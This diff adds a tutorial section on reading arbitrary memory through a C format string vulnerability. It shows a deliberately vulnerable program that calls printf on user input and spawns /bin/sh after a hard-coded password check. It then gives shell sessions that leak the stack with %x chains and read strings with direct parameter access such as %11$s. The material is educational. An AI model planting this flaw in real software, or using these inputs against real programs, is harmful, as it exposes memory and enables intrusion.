@@ -101,3 +101,80 @@ On the last one, it will write the number of bytes written at the address within
 ```
 
 ## Read arbitrary data
+
+Consider this program:
+```C
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+// gcc read-arbitrary-data.c -o read-arbitrary-data -m32
+
+int main(int argc, char *argv[]){
+  const char *allow = "Access granted.\n";
+  const char *deny = "Access denied.\n";
+  char buff[200];
+  read(1, buff, 200);
+  if (strncmp("password\0", buff, 9) == 0) {
+    printf(allow);
+    system("/bin/sh");
+  } else {
+    printf(deny);
+    printf("Say goodbye!!!");
+  }
+  read(1, buff, 200);
+  printf(buff);
+}
+```
+
+Try to exploit it. Suppose that we don't know the password:
+```bash
+$ ./read-arbitrary-data
+afasfsf
+Access denied.
+AAAAAAAAAAAAAAAAA
+Say goodbye!!!AAAAAAAAAAAAAAAAA
+```
+
+Okay, we see that the program mirrors our string. Let's try format string.
+```bash
+$ ./read-arbitrary-data
+asdfafaf
+Access denied.
+AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
+Say goodbye!!!AAAAffc06134.c8.5659824d.0.100.40.ffc062c4.0.0.0.56599008.56599019.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+```
+
+Again, you meet the value `0x41414141` which is the beginning of our string. But, what are the values before it? Check it out with %s.
+```bash
+$ ./read-arbitrary-data
+sadfafa
+Access denied.
+AAAA%s %s %s %s %s %s %s %s %s %s
+Say goodbye!!!AAAAAAAA%s %s %s %s %s %s %s %s %s %s
+Segmentation fault (core dumped)
+```
+
+So, the program crashed because it can't find something useful at the address, for instance from the output above, of value `100` or `40`. These values are not the right address. And that's why you need to know about direct parameter access. In other words, you don't need to input chains like `%x.%x.%x.%x.%x.%x.%x.%x.`, you can access, for example, the `0x41414141` value from the output above, with this string `%13$s`. 13 is the number of the parameter in the format string, which is the beginning of our string. BUT. The format specifier `%s` is waiting for the address, but we will give it the value `0x41414141`.
+
+```bash
+$ ./read-arbitrary-data
+asfasfa
+Access denied.
+AAAA%13$s
+Segmentation fault (core dumped)
+```
+
+The program crashed.
+
+Thus, with a little brute-force of the direct parameter access number or just specify the needed address at the beginning of the input string, you can read arbitrary data. Let's read the strings `Access denied.` and `Access granted.` which are just before our input string.
+
+```bash
+$ ./read-arbitrary-data
+asfsadfas
+Access denied.
+AAAA%11$s%12$s
+Say goodbye!!!AAAAAccess granted.
+Access denied.
+
+```
